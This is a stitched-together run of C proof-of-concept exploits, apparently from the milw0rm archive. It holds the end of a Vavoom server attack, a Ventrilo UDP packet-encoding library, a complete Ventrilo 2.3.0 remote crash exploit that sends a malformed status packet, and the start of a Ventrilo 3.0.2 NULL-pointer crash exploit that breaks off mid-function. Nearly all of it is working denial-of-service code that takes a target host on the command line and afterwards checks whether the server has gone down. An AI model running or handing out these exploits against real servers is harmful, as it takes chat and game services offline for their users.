        *crc   = htons(vavoom_crc(buff + NET_HEADERSIZE, len - NET_HEADERSIZE));

    } else {
        printf("\nError: wrong attack number (%d)\n\n", attack);
        exit(1);
    }

    len = send_recv(sd, buff, len, buff, sizeof(buff), 0);
    if(len < 0) {
        printf("- no reply from the server\n");
    }

    close(sd);

quit:
    printf("- wait some seconds\n");
    for(i = 3; i; i--) {
        printf("%d\r", i);
        sleep(ONESEC);
    }

    printf("- check server:\n");
    peer.sin_port = htons(port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    p      = buff + 4;
    *p++   = CCREQ_SERVER_INFO;
    p     += mycpy(p, "VAVOOM");
    *p++   = ver;
    len    = p - buff;
    *flags = htonl(FLAGZ(NETFLAG_CTL, 0));

    if(send_recv(sd, buff, len, buff, sizeof(buff), 0) < 0) {
        printf("\n  Server IS vulnerable!!!\n\n");
    } else {
        printf("\n  Server does not seem vulnerable\n\n");
    }
    close(sd);
    return(0);
}



int info_proto(u_char *data, int len) {
    u_int   flags;
    int     ver;
    u_char  cmd,
            *limit;

    limit = data + len;
    flags = *(u_int *)data;                                 data += 4;
    cmd   = *data;                                          data++;
    printf("  Hostname   %s\n", data);                      data += strlen(data) + 1;
    printf("  Level      %s\n", data);                      data += strlen(data) + 1;
    printf("  Players    %hhu/%hhu\n", data[0], data[1]);   data += 2;
    ver   = *data;                                          data++;
    printf("  Version    %d\n", ver);
    printf("  Wads       ");
    while(data < limit) {
        printf("%s", data);                                 data += strlen(data) + 1;
        if(!*data) break;
        printf(", ");
    }
    printf("\n");

    return(ver);
}



u_short vavoom_crc(u_char *data, int len) {
    u_short crc;
    const static u_short table[] = {
        0x0000,	0x1021,	0x2042,	0x3063,	0x4084,	0x50a5,	0x60c6,	0x70e7,
        0x8108,	0x9129,	0xa14a,	0xb16b,	0xc18c,	0xd1ad,	0xe1ce,	0xf1ef,
        0x1231,	0x0210,	0x3273,	0x2252,	0x52b5,	0x4294,	0x72f7,	0x62d6,
        0x9339,	0x8318,	0xb37b,	0xa35a,	0xd3bd,	0xc39c,	0xf3ff,	0xe3de,
        0x2462,	0x3443,	0x0420,	0x1401,	0x64e6,	0x74c7,	0x44a4,	0x5485,
        0xa56a,	0xb54b,	0x8528,	0x9509,	0xe5ee,	0xf5cf,	0xc5ac,	0xd58d,
        0x3653,	0x2672,	0x1611,	0x0630,	0x76d7,	0x66f6,	0x5695,	0x46b4,
        0xb75b,	0xa77a,	0x9719,	0x8738,	0xf7df,	0xe7fe,	0xd79d,	0xc7bc,
        0x48c4,	0x58e5,	0x6886,	0x78a7,	0x0840,	0x1861,	0x2802,	0x3823,
        0xc9cc,	0xd9ed,	0xe98e,	0xf9af,	0x8948,	0x9969,	0xa90a,	0xb92b,
        0x5af5,	0x4ad4,	0x7ab7,	0x6a96,	0x1a71,	0x0a50,	0x3a33,	0x2a12,
        0xdbfd,	0xcbdc,	0xfbbf,	0xeb9e,	0x9b79,	0x8b58,	0xbb3b,	0xab1a,
        0x6ca6,	0x7c87,	0x4ce4,	0x5cc5,	0x2c22,	0x3c03,	0x0c60,	0x1c41,
        0xedae,	0xfd8f,	0xcdec,	0xddcd,	0xad2a,	0xbd0b,	0x8d68,	0x9d49,
        0x7e97,	0x6eb6,	0x5ed5,	0x4ef4,	0x3e13,	0x2e32,	0x1e51,	0x0e70,
        0xff9f,	0xefbe,	0xdfdd,	0xcffc,	0xbf1b,	0xaf3a,	0x9f59,	0x8f78,
        0x9188,	0x81a9,	0xb1ca,	0xa1eb,	0xd10c,	0xc12d,	0xf14e,	0xe16f,
        0x1080,	0x00a1,	0x30c2,	0x20e3,	0x5004,	0x4025,	0x7046,	0x6067,
        0x83b9,	0x9398,	0xa3fb,	0xb3da,	0xc33d,	0xd31c,	0xe37f,	0xf35e,
        0x02b1,	0x1290,	0x22f3,	0x32d2,	0x4235,	0x5214,	0x6277,	0x7256,
        0xb5ea,	0xa5cb,	0x95a8,	0x8589,	0xf56e,	0xe54f,	0xd52c,	0xc50d,
        0x34e2,	0x24c3,	0x14a0,	0x0481,	0x7466,	0x6447,	0x5424,	0x4405,
        0xa7db,	0xb7fa,	0x8799,	0x97b8,	0xe75f,	0xf77e,	0xc71d,	0xd73c,
        0x26d3,	0x36f2,	0x0691,	0x16b0,	0x6657,	0x7676,	0x4615,	0x5634,
        0xd94c,	0xc96d,	0xf90e,	0xe92f,	0x99c8,	0x89e9,	0xb98a,	0xa9ab,
        0x5844,	0x4865,	0x7806,	0x6827,	0x18c0,	0x08e1,	0x3882,	0x28a3,
        0xcb7d,	0xdb5c,	0xeb3f,	0xfb1e,	0x8bf9,	0x9bd8,	0xabbb,	0xbb9a,
        0x4a75,	0x5a54,	0x6a37,	0x7a16,	0x0af1,	0x1ad0,	0x2ab3,	0x3a92,
        0xfd2e,	0xed0f,	0xdd6c,	0xcd4d,	0xbdaa,	0xad8b,	0x9de8,	0x8dc9,
        0x7c26,	0x6c07,	0x5c64,	0x4c45,	0x3ca2,	0x2c83,	0x1ce0,	0x0cc1,
        0xef1f,	0xff3e,	0xcf5d,	0xdf7c,	0xaf9b,	0xbfba,	0x8fd9,	0x9ff8,
        0x6e17,	0x7e36,	0x4e55,	0x5e74,	0x2e93,	0x3eb2,	0x0ed1,	0x1ef0
    };

    crc = 0xffff;

    while(len--) {
        crc = (crc << 8) ^ table[(crc >> 8) ^ *data];
        data++;
    }

    return(crc);
}



int mycpy(u_char *dst, u_char *src) {
    u_char  *p;

    for(p = dst; *src; src++, p++) {
        *p = *src;
    }
    *p++ = 0;
    return(p - dst);
}



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err) {
    int     retry,
            len;

    if(in) {
        for(retry = 3; retry; retry--) {
            if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer))
              < 0) std_err();
            if(!timeout(sd, 2)) break;
        }

        if(!retry) {
            if(!err) return(-1);
            fputs("\nError: socket timeout, no reply received\n\n", stdout);
            exit(1);
        }
    } else {
        if(timeout(sd, 3) < 0) return(-1);
    }

    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) std_err();
    return(len);
}



int timeout(int sock, int sec) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = sec;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2006-03-26]
/*

by Luigi Auriemma


Windows compiled version:
http://aluigi.altervista.org/poc/ventboom.zip
/str0ke
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
/*

Ventrilo UDP status algorithm 0.1
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    http://aluigi.altervista.org


INTRODUCTION
============
This algorithm is the method used by the chat program Ventrilo
(http://www.ventrilo.com) for encoding the UDP packets used to get
the status informations.


FUNCTIONS
=========
struct ventrilo_udp_head
void ventrilo_udp_head_dec(unsigned char *data)
void ventrilo_udp_head_enc(unsigned char *data)
void ventrilo_udp_data_dec(unsigned char *data, int len, unsigned short key)
unsigned short ventrilo_udp_data_enc(unsigned char *data, int len)
unsigned short ventrilo_udp_crc(unsigned char *data, int len)


USAGE EXAMPLE
=============
Watch my "Ventrilo status retriever" code for a simple and practical example:

  http://aluigi.altervista.org/papers/ventstat.zip


LICENSE
=======
    Copyright 2005 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt

*/

#include <time.h>
#ifdef WIN32
    #include <winsock.h>
    #define VENTRILO_RAND   clock()
#else
    #include <netinet/in.h>
    #include <sys/times.h>
    #define VENTRILO_RAND   times(0)
#endif



typedef struct {
    unsigned short pckkey;  // key for decoding this header
    unsigned short zero;    // ever 0
    unsigned short cmd;     // command number: 1 generic info, 2 for details
    unsigned short id;      // packet ID used for tracking the replies
    unsigned short totlen;  // total data size (for data splitted in packets)
    unsigned short len;     // size of the data in this packet (max 492)
    unsigned short totpck;  // total amount of packets (max 32)
    unsigned short pck;     // current packet number
    unsigned short datakey; // key for decoding the data
    unsigned short crc;     // checksum of the total plain-text data
} ventrilo_udp_head;



const static unsigned char  ventrilo_udp_encdata_head[] =
    "\x80\xe5\x0e\x38\xba\x63\x4c\x99\x88\x63\x4c\xd6\x54\xb8\x65\x7e"
    "\xbf\x8a\xf0\x17\x8a\xaa\x4d\x0f\xb7\x23\x27\xf6\xeb\x12\xf8\xea"
    "\x17\xb7\xcf\x52\x57\xcb\x51\xcf\x1b\x14\xfd\x6f\x84\x38\xb5\x24"
    "\x11\xcf\x7a\x75\x7a\xbb\x78\x74\xdc\xbc\x42\xf0\x17\x3f\x5e\xeb"
    "\x74\x77\x04\x4e\x8c\xaf\x23\xdc\x65\xdf\xa5\x65\xdd\x7d\xf4\x3c"
    "\x4c\x95\xbd\xeb\x65\x1c\xf4\x24\x5d\x82\x18\xfb\x50\x86\xb8\x53"
    "\xe0\x4e\x36\x96\x1f\xb7\xcb\xaa\xaf\xea\xcb\x20\x27\x30\x2a\xae"
    "\xb9\x07\x40\xdf\x12\x75\xc9\x09\x82\x9c\x30\x80\x5d\x8f\x0d\x09"
    "\xa1\x64\xec\x91\xd8\x8a\x50\x1f\x40\x5d\xf7\x08\x2a\xf8\x60\x62"
    "\xa0\x4a\x8b\xba\x4a\x6d\x00\x0a\x93\x32\x12\xe5\x07\x01\x65\xf5"
    "\xff\xe0\xae\xa7\x81\xd1\xba\x25\x62\x61\xb2\x85\xad\x7e\x9d\x3f"
    "\x49\x89\x26\xe5\xd5\xac\x9f\x0e\xd7\x6e\x47\x94\x16\x84\xc8\xff"
    "\x44\xea\x04\x40\xe0\x33\x11\xa3\x5b\x1e\x82\xff\x7a\x69\xe9\x2f"
    "\xfb\xea\x9a\xc6\x7b\xdb\xb1\xff\x97\x76\x56\xf3\x52\xc2\x3f\x0f"
    "\xb6\xac\x77\xc4\xbf\x59\x5e\x80\x74\xbb\xf2\xde\x57\x62\x4c\x1a"
    "\xff\x95\x6d\xc7\x04\xa2\x3b\xc4\x1b\x72\xc7\x6c\x82\x60\xd1\x0d";

const static unsigned char  ventrilo_udp_encdata_data[] =
    "\x82\x8b\x7f\x68\x90\xe0\x44\x09\x19\x3b\x8e\x5f\xc2\x82\x38\x23"
    "\x6d\xdb\x62\x49\x52\x6e\x21\xdf\x51\x6c\x76\x37\x86\x50\x7d\x48"
    "\x1f\x65\xe7\x52\x6a\x88\xaa\xc1\x32\x2f\xf7\x54\x4c\xaa\x6d\x7e"
    "\x6d\xa9\x8c\x0d\x3f\xff\x6c\x09\xb3\xa5\xaf\xdf\x98\x02\xb4\xbe"
    "\x6d\x69\x0d\x42\x73\xe4\x34\x50\x07\x30\x79\x41\x2f\x08\x3f\x42"
    "\x73\xa7\x68\xfa\xee\x88\x0e\x6e\xa4\x70\x74\x22\x16\xae\x3c\x81"
    "\x14\xa1\xda\x7f\xd3\x7c\x48\x7d\x3f\x46\xfb\x6d\x92\x25\x17\x36"
    "\x26\xdb\xdf\x5a\x87\x91\x6f\xd6\xcd\xd4\xad\x4a\x29\xdd\x7d\x59"
    "\xbd\x15\x34\x53\xb1\xd8\x50\x11\x83\x79\x66\x21\x9e\x87\x5b\x24"
    "\x2f\x4f\xd7\x73\x34\xa2\xf7\x09\xd5\xd9\x42\x9d\xf8\x15\xdf\x0e"
    "\x10\xcc\x05\x04\x35\x81\xb2\xd5\x7a\xd2\xa0\xa5\x7b\xb8\x75\xd2"
    "\x35\x0b\x39\x8f\x1b\x44\x0e\xce\x66\x87\x1b\x64\xac\xe1\xca\x67"
    "\xb4\xce\x33\xdb\x89\xfe\xd8\x8e\xcd\x58\x92\x41\x50\x40\xcb\x08"
    "\xe1\x15\xee\xf4\x64\xfe\x1c\xee\x25\xe7\x21\xe6\x6c\xc6\xa6\x2e"
    "\x52\x23\xa7\x20\xd2\xd7\x28\x07\x23\x14\x24\x3d\x45\xa5\xc7\x90"
    "\xdb\x77\xdd\xea\x38\x59\x89\x32\xbc\x00\x3a\x6d\x61\x4e\xdb\x29";



void ventrilo_udp_head_dec(unsigned char *data) {
    int             i;
    unsigned short  *p;
    unsigned char   a1,
                    a2;

    p = (unsigned short *)data;
    data += 2;

    *p = ntohs(*p);
    a1 = *p;
    if(!a1) return;
    a2 = *p >> 8;

    for(i = 0; i < 18; i++) {
        data[i] -= ventrilo_udp_encdata_head[a2] + (i % 5);
        a2 += a1;
    }

    for(i = 0; i < 9; i++) {
        p++;
        *p = ntohs(*p);
    }
}



void ventrilo_udp_head_enc(unsigned char *data) {
    int             i;
    unsigned short  *p;
    unsigned char   a1,
                    a2;

    p = (unsigned short *)data;
    data += 2;

    *p = (((VENTRILO_RAND * 0x343fd) + 0x269ec3) >> 16) & 0x7fff;
    a1 = *p;
    a2 = *p >> 8;
    if(!a2) {
        a2 = 69;
        *p |= (a2 << 8);
    }

    for(i = 0; i < 10; i++) {
        *p = htons(*p);
        p++;
    }

    for(i = 0; i < 18; i++) {
        data[i] += ventrilo_udp_encdata_head[a2] + (i % 5);
        a2 += a1;
    }
}



void ventrilo_udp_data_dec(unsigned char *data, int len, unsigned short key) {
    int             i;
    unsigned char   a1,
                    a2;

    a1 = key;
    if(!a1) return;
    a2 = key >> 8;

    for(i = 0; i < len; i++) {
        data[i] -= ventrilo_udp_encdata_data[a2] + (i % 72);
        a2 += a1;
    }
}



unsigned short ventrilo_udp_data_enc(unsigned char *data, int len) {
    int             i;
    unsigned short  key;
    unsigned char   a1,
                    a2;

    key = (((VENTRILO_RAND * 0x343fd) + 0x269ec3) >> 16) & 0x7fff;
    a1 = key;
    a2 = key >> 8;
    if(!a2) {
        a2 = 1;
        key |= (a2 << 8);
    }

    for(i = 0; i < len; i++) {
        data[i] += ventrilo_udp_encdata_data[a2] + (i % 72);
        a2 += a1;
    }

    return(key);
}



unsigned short ventrilo_udp_crc(unsigned char *data, int len) {
    unsigned short  crc = 0;
    const static unsigned short table[] = {
        0x0000, 0x1021, 0x2042, 0x3063, 0x4084, 0x50a5, 0x60c6, 0x70e7,
        0x8108, 0x9129, 0xa14a, 0xb16b, 0xc18c, 0xd1ad, 0xe1ce, 0xf1ef,
        0x1231, 0x0210, 0x3273, 0x2252, 0x52b5, 0x4294, 0x72f7, 0x62d6,
        0x9339, 0x8318, 0xb37b, 0xa35a, 0xd3bd, 0xc39c, 0xf3ff, 0xe3de,
        0x2462, 0x3443, 0x0420, 0x1401, 0x64e6, 0x74c7, 0x44a4, 0x5485,
        0xa56a, 0xb54b, 0x8528, 0x9509, 0xe5ee, 0xf5cf, 0xc5ac, 0xd58d,
        0x3653, 0x2672, 0x1611, 0x0630, 0x76d7, 0x66f6, 0x5695, 0x46b4,
        0xb75b, 0xa77a, 0x9719, 0x8738, 0xf7df, 0xe7fe, 0xd79d, 0xc7bc,
        0x48c4, 0x58e5, 0x6886, 0x78a7, 0x0840, 0x1861, 0x2802, 0x3823,
        0xc9cc, 0xd9ed, 0xe98e, 0xf9af, 0x8948, 0x9969, 0xa90a, 0xb92b,
        0x5af5, 0x4ad4, 0x7ab7, 0x6a96, 0x1a71, 0x0a50, 0x3a33, 0x2a12,
        0xdbfd, 0xcbdc, 0xfbbf, 0xeb9e, 0x9b79, 0x8b58, 0xbb3b, 0xab1a,
        0x6ca6, 0x7c87, 0x4ce4, 0x5cc5, 0x2c22, 0x3c03, 0x0c60, 0x1c41,
        0xedae, 0xfd8f, 0xcdec, 0xddcd, 0xad2a, 0xbd0b, 0x8d68, 0x9d49,
        0x7e97, 0x6eb6, 0x5ed5, 0x4ef4, 0x3e13, 0x2e32, 0x1e51, 0x0e70,
        0xff9f, 0xefbe, 0xdfdd, 0xcffc, 0xbf1b, 0xaf3a, 0x9f59, 0x8f78,
        0x9188, 0x81a9, 0xb1ca, 0xa1eb, 0xd10c, 0xc12d, 0xf14e, 0xe16f,
        0x1080, 0x00a1, 0x30c2, 0x20e3, 0x5004, 0x4025, 0x7046, 0x6067,
        0x83b9, 0x9398, 0xa3fb, 0xb3da, 0xc33d, 0xd31c, 0xe37f, 0xf35e,
        0x02b1, 0x1290, 0x22f3, 0x32d2, 0x4235, 0x5214, 0x6277, 0x7256,
        0xb5ea, 0xa5cb, 0x95a8, 0x8589, 0xf56e, 0xe54f, 0xd52c, 0xc50d,
        0x34e2, 0x24c3, 0x14a0, 0x0481, 0x7466, 0x6447, 0x5424, 0x4405,
        0xa7db, 0xb7fa, 0x8799, 0x97b8, 0xe75f, 0xf77e, 0xc71d, 0xd73c,
        0x26d3, 0x36f2, 0x0691, 0x16b0, 0x6657, 0x7676, 0x4615, 0x5634,
        0xd94c, 0xc96d, 0xf90e, 0xe92f, 0x99c8, 0x89e9, 0xb98a, 0xa9ab,
        0x5844, 0x4865, 0x7806, 0x6827, 0x18c0, 0x08e1, 0x3882, 0x28a3,
        0xcb7d, 0xdb5c, 0xeb3f, 0xfb1e, 0x8bf9, 0x9bd8, 0xabbb, 0xbb9a,
        0x4a75, 0x5a54, 0x6a37, 0x7a16, 0x0af1, 0x1ad0, 0x2ab3, 0x3a92,
        0xfd2e, 0xed0f, 0xdd6c, 0xcd4d, 0xbdaa, 0xad8b, 0x9de8, 0x8dc9,
        0x7c26, 0x6c07, 0x5c64, 0x4c45, 0x3ca2, 0x2c83, 0x1ce0, 0x0cc1,
        0xef1f, 0xff3e, 0xcf5d, 0xdf7c, 0xaf9b, 0xbfba, 0x8fd9, 0x9ff8,
        0x6e17, 0x7e36, 0x4e55, 0x5e74, 0x2e93, 0x3eb2, 0x0ed1, 0x1ef0
    };

    while(len--) {
        crc = table[crc >> 8] ^ *data ^ (crc << 8);
        data++;
    }

    return(crc);
}


#undef VENTRILO_RAND

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

//inserted headers /str0ke

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER         "0.1"
#define PORT        3784
#define MAXPCK      32
#define MAXPCKSZ    492
#define TIMEOUT     2
#define RETRY       2



int ventrilo_get_status(int sd, u_short cmd, u_char *pass, int bug);
int timeout(int sock);
u_int resolv(char *host);
void std_err(void);



struct  sockaddr_in peer;



int main(int argc, char *argv[]) {
    int     sd;
    u_short port = PORT;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "Ventrilo <= 2.3.0 server crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    fputs("\n- check server:\n", stdout);
    if(ventrilo_get_status(sd, 1, "", 0) < 0) {
        fputs("\nError: no reply received, probably the server is not online\n\n", stdout);
        exit(1);
    }

    sleep(ONESEC);

    fputs("\n- send BOOM packet:\n", stdout);
    ventrilo_get_status(sd, 1, "", 1);

    sleep(ONESEC);

    fputs("\n- check server:\n", stdout);
    if(ventrilo_get_status(sd, 1, "", 0) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }

    close(sd);
    return(0);
}



int ventrilo_get_status(int sd, u_short cmd, u_char *pass, int bug) {
    ventrilo_udp_head   *stat;
    int     i,
            len,
            totlen,
            retry;
    u_short id,
            crc;
    u_char  buff[20 + MAXPCKSZ],
            full[MAXPCKSZ * MAXPCK],
            *data;

    stat = (ventrilo_udp_head *)buff;
    data = buff + 20;

    strncpy(data, pass, 16);

    stat->zero    = 0;
    stat->cmd     = cmd;
    stat->id      = id = time(NULL);
    stat->totlen  = 16;
    stat->len     = 16;
    stat->totpck  = 1;
    stat->pck     = 0;
    stat->crc     = ventrilo_udp_crc(data, 16);
    stat->datakey = ventrilo_udp_data_enc(data, 16);
    ventrilo_udp_head_enc(buff);

    for(retry = RETRY; retry; retry--) {
        sendto(sd, buff,
            20 + (bug ? 0 : 16),    // BUG exploited here
            0, (struct sockaddr *)&peer, sizeof(peer));
        if(!timeout(sd)) break;
    }
    if(!retry) return(-1);

    i      = 0;
    totlen = 0;
    memset(full, ' ', sizeof(full));    // in case of packet loss

    for(;;) {
        len = recvfrom(sd, buff, sizeof(buff), 0, NULL, NULL);
        ventrilo_udp_head_dec(buff);

        if(stat->id != id) continue;

        if((len < 20)                 ||
           (stat->totpck < stat->pck) ||
           (stat->totpck > MAXPCK)    ||
           (stat->len    > MAXPCKSZ)) {
            fputs("\nError: wrong or incomplete reply received\n", stdout);
            return(0);
        }

        len    = stat->len;
        totlen += len;
        if(totlen > sizeof(full)) break;

        ventrilo_udp_data_dec(data, len, stat->datakey);
        memcpy(full + (stat->pck * MAXPCKSZ), data, len);

        if(++i == stat->totpck) break;
        if(totlen == stat->totlen) break;
        if(timeout(sd) < 0) break;
    }

    crc = ventrilo_udp_crc(full, totlen);
    if(ventrilo_udp_crc(full, totlen) != stat->crc) {
        printf("- wrong checksum: mine is %04x while should be %04x\n\n", crc, stat->crc);
    }

    fwrite(full, totlen, 1, stdout);
    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_int resolv(char *host) {
    struct hostent *hp;
    u_int  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2005-08-23]
/*
    Copyright 2008 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include <time.h>
#include "ventrilo_algo.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close       closesocket
    #define sleep       Sleep
    #define ONESEC      1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
    #include <sys/times.h>

    #define ONESEC      1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define BUFFSZ      0xffff
#define PORT        3784
#define TIMEOUT     5



int connerr(void);
int putxx(u8 *data, u32 num, int bits);
int putss(u8 *data, u8 *val, int len);
int send_ventrilo(int sd, ventrilo_key_ctx *client, u8 *buff, int len);
int recv_ventrilo(int sd, ventrilo_key_ctx *server, u8 *buff);
int rndxx(u8 *data, int len, u32 *seed, int fixlen);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);




int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    u32     seed;
    int     sd,
            len;
    u16     port    = PORT;
    u8      *buff,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Ventrilo <= 3.0.2 NULL pointer "VER"\n"
        "by Luigi Auriemma and Andre Malm\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <server> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target:   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    seed  = time(NULL);
    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    printf("- connect\n");
    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    printf("- send a wrong version packet\n");
    p = buff;
    p += putxx(p, 0, 32);
    p += rndxx(p, 16, &seed, 1);
    p += rndxx(p, 32, &seed, 1);
    p += rndxx(p, 32, &seed, 1);

    if(send_ventrilo(sd, NULL, buff, p - buff) < 0) connerr();
    len = recv_ventrilo(sd, NULL, buff);
    if(len < 0) connerr();

    printf("- send some data for forcing the decryption function\n");
    p = buff;
    p += putxx(p, 0, 32);   // can be anything, it's enough to send something
    if(send_ventrilo(sd, NULL, buff, p - buff) < 0) connerr();
    len = recv_ventrilo(sd, NULL, buff);
    close(sd);

    printf("- wait some seconds\n");
    sleep(ONESEC * 2);

    printf("- test server:\n");
    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer)) < 0) {
        printf("\n  Server IS vulnerable!!!\n");
    } else {    // the following message will appear if the server is attached to a debugger too
        printf("\n  Server doesn't seem vulnerable\n");
    }
    close(sd);
    free(buff);
    return(0);
}



int connerr(void) {
